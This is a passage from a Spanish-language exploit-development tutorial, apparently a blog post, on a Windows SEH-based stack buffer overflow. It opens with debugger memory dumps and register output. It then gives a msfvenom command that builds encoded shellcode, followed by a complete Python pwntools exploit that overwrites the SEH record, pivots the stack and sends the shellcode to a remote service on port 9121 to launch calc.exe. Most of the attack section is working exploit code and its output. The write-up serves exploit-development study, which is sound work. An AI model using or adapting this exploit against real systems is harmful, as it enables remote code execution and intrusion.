01c1fad8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fae8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1faf8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb08  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb18  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb28  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb38  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb48  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb58  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb68  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb78  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
01c1fb88  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=77af8aa2 ecx=10132edc edx=77af8ac0 esi=00000000 edi=01c1f4e8
eip=01c1fa98 esp=01c1fa98 ebp=01c1f408 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
01c1fa98 44              inc     esp</span>
</code></pre></div></div><br>

</section>

<section class="post" id="commands">
<br><h3 class="post-title">Execute Commands</h3><br>

<p class="plain-text">Ya que tenemos una forma de ejecutar instrucciones podemos generar un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code> que en caso de interpretarse ejecute el comando <code class="language-plaintext highlighter-rouge">calc.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/exec CMD=calc.exe -f python -v shellcode -b </span><span class="am">'\x00\x02\x0a\x0d\xf8\xfd'</span><span class="p"> -e x86/jmp_call_additive  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 225 (iteration=0)
x86/jmp_call_additive chosen with final size 225
Payload size: 225 bytes
Final size of python file: 1274 bytes
shellcode =  b""
shellcode += b"\xfc\xbb\x4b\x99\xd4\xef\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xb7\x71\x56\xef\x47\x82\x37\x79"
shellcode += b"\xa2\xb3\x77\x1d\xa7\xe4\x47\x55\xe5\x08\x23"
shellcode += b"\x3b\x1d\x9a\x41\x94\x12\x2b\xef\xc2\x1d\xac"
shellcode += b"\x5c\x36\x3c\x2e\x9f\x6b\x9e\x0f\x50\x7e\xdf"
shellcode += b"\x48\x8d\x73\x8d\x01\xd9\x26\x21\x25\x97\xfa"
shellcode += b"\xca\x75\x39\x7b\x2f\xcd\x38\xaa\xfe\x45\x63"
shellcode += b"\x6c\x01\x89\x1f\x25\x19\xce\x1a\xff\x92\x24"
shellcode += b"\xd0\xfe\x72\x75\x19\xac\xbb\xb9\xe8\xac\xfc"
shellcode += b"\x7e\x13\xdb\xf4\x7c\xae\xdc\xc3\xff\x74\x68"
shellcode += b"\xd7\x58\xfe\xca\x33\x58\xd3\x8d\xb0\x56\x98"
shellcode += b"\xda\x9e\x7a\x1f\x0e\x95\x87\x94\xb1\x79\x0e"
shellcode += b"\xee\x95\x5d\x4a\xb4\xb4\xc4\x36\x1b\xc8\x16"
shellcode += b"\x99\xc4\x6c\x5d\x34\x10\x1d\x3c\x53\xe7\x93"
shellcode += b"\x3b\x11\xe7\xab\x43\x06\x80\x9a\xc8\xc9\xd7"
shellcode += b"\x22\x1b\xae\x28\x69\x01\x87\xa0\x34\xd0\x95"
shellcode += b"\xac\xc6\x0f\xd9\xc8\x44\xa5\xa2\x2e\x54\xcc"
shellcode += b"\xa7\x6b\xd2\x3d\xda\xe4\xb7\x41\x49\x04\x92"
shellcode += b"\x22\x0c\x96\x7e\x8a\xab\x1e\xe4\xd2\x33\xdf"
shellcode += b"\xe6\xd2\x33\xdf\xe6"</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit final sobrescribe la estructura SEH para despues de ejecutar el handler <code class="language-plaintext highlighter-rouge">pop pop ret</code> y el <code class="language-plaintext highlighter-rouge">short jump</code> haga un stack pivot y salte al <code class="language-plaintext highlighter-rouge">shellcode</code> enviado</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">124</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

nseh </span><span class="o">= </span><span class="p">asm(</span><span class="s">"jmp $+8"</span><span class="p">).ljust(</span><span class="mi">4</span><span class="p">, </span><span class="no">b</span><span class="s">"A"</span><span class="p">)
seh </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x10132edc</span><span class="p">)

shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\x4b\x99\xd4\xef\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\xb7\x71\x56\xef\x47\x82\x37\x79</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa2\xb3\x77\x1d\xa7\xe4\x47\x55\xe5\x08\x23</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3b\x1d\x9a\x41\x94\x12\x2b\xef\xc2\x1d\xac</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5c\x36\x3c\x2e\x9f\x6b\x9e\x0f\x50\x7e\xdf</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x48\x8d\x73\x8d\x01\xd9\x26\x21\x25\x97\xfa</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xca\x75\x39\x7b\x2f\xcd\x38\xaa\xfe\x45\x63</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6c\x01\x89\x1f\x25\x19\xce\x1a\xff\x92\x24</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd0\xfe\x72\x75\x19\xac\xbb\xb9\xe8\xac\xfc</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x7e\x13\xdb\xf4\x7c\xae\xdc\xc3\xff\x74\x68</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd7\x58\xfe\xca\x33\x58\xd3\x8d\xb0\x56\x98</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xda\x9e\x7a\x1f\x0e\x95\x87\x94\xb1\x79\x0e</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xee\x95\x5d\x4a\xb4\xb4\xc4\x36\x1b\xc8\x16</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x99\xc4\x6c\x5d\x34\x10\x1d\x3c\x53\xe7\x93</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3b\x11\xe7\xab\x43\x06\x80\x9a\xc8\xc9\xd7</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x22\x1b\xae\x28\x69\x01\x87\xa0\x34\xd0\x95</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xac\xc6\x0f\xd9\xc8\x44\xa5\xa2\x2e\x54\xcc</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa7\x6b\xd2\x3d\xda\xe4\xb7\x41\x49\x04\x92</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x22\x0c\x96\x7e\x8a\xab\x1e\xe4\xd2\x33\xdf</span><span class="s">"</span><span class="p">  
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe6\xd2\x33\xdf\xe6</span><span class="s">"</span><span class="p">  

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">nseh </span><span class="o">+ </span><span class="p">seh
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"add sp, 0x6a4"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jmp esp"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"nop"</span><span class="p">)
payload </span><span class="o">+= </span><span class="p">shellcode
payload </span><span class="o">+= </span><span class="no">b</span><span class="s">"D" </span><span class="o">* </span><span class="p">(</span><span class="mi">1000 </span><span class="o">- </span><span class="no">len</span><span class="p">(payload))

header  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0xabba1975</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x3</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="mi">0x1</span><span class="p">)
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(</span><span class="no">len</span><span class="p">(payload))
header </span><span class="o">+= </span><span class="p">p32(payload[</span><span class="o">-</span><span class="mi">1</span><span class="p">])

content </span><span class="o">= </span><span class="p">header </span><span class="o">+ </span><span class="p">payload

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">9121</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Como resultado conseguimos controlar el programa y ejecutar el shellcode que ejecuta el comando <code class="language-plaintext highlighter-rouge">calc.exe</code> por lo que se abre una calculadora en la maquina</p>
<a href="/exploit-development/windows-user/seh-overflow/5.png" target="_blank"><div><p><img src="/exploit-development/windows-user/seh-overflow/5.png"></p></div></a>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
